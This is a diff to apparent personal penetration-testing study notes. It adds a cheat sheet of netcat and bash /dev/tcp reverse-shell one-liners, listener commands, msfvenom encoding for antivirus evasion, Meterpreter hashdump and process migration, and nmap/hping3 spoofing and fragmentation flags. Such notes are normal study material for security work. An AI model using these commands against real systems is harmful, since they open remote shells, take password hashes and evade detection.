@@ -86,16 +86,28 @@
 
 # Shells
 - Reverse:
-  - target: 
-    - nc <LOCAL-IP> <PORT> -e /bin/bash
-    - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
-    - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
-    - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-    - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
-    - No NC:
-      - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
-      - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
-  - Ziel: nc -nlvp PORT
+  - [Atacker] LISTENER <---------[Victim]
+- - Binding:
+  - [Victim] LISTENER <---------[Atacker]
+
+- **Connect**
+  - -u = UDP connection
+  - nc <LOCAL-IP> <PORT> -e /bin/bash
+  - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
+  - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
+  - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
+  - **No NC**:
+    - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
+    - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
+  
+- **Listener**
+  - nc -nlvp PORT ==> TCP listener
+  - nc -ulvnp PORT ==> UDP listener
+
+
+
+
 
 ## PWNCAT-CS
 - nc with steroids
@@ -258,9 +270,21 @@
   - still can be detected by AVs
   - Better: encode + encrypt + packers + binder
 
+- Encoding and Encrypting
+  - msfvenom --list encoders / encrpyt
+  - -e encoder_option
+  - -i interation
+
+
 ## Meterpreter
 - sysinfo
 - getpid
+- hashdump (migrate to process first)
+- getpid
+- getpriv
+- migrate PID [try and error, migrating to existing process] + check hashdump
+- search
+
 
 ## Metasploit with database
 
@@ -281,26 +305,45 @@
 - workspace name (move to name)
 
 ### NMAP - DB_NMAP
-- db_nmap 
+- db_nmap | nmap
+- Scripts
   - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
     - https://www.exploit-db.com/
     - https://nvd.nist.gov/vuln/full-listing
   - -sC: other common scripts
-  - -sS (Syn), -sA(Ack)
+  
+- Basic scans
+  - -sS (Syn), -sA(Ack), -sU (UDP)
   - -A: basic scan with OS include
     - -sV -O -sC [default scripts] --traceroute
-  - -p-: all ports
   - -sV: version of services found
-  - -Pn: no ping
-  - -T[0-5] = Control speed
+  - -p-: all ports
+  - -g 123 / --source-port 123 ==> all trafic from the specific port number
+    - UPD 53 - dns
+    - TCP 80 - http
   - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
+  - -Pn: no ping
   - --spoof-mac [MAC]
-  - -f[-f] => fragment
-  - --reason / -v / -vv / -d / -dd
+  
+- Size and intensitiy
+  - -T[0-5] = Control speed
+  - -F = faster
+  -  -f = 8 bytes / -ff 16 byes = fragmentation
+  - --mtu 128 = custom size
 
 - Output
+  - --reason / -v / -vv / -d / -dd
   - -oN = normal output
   - -oG = grep output
+
+- Invalid packets
+  - --badsum = alterad package
+  - --scanflags URG,ACK,PSH,RST,SYN,FYN {SYNRSTFIN}
+  - Alternative
+    - hping3
+      - -t time to live
+      - -b badsum
+      - -S,-A,-P-U-F-R
 
 - hosts: list hosts from db
   - -a: add
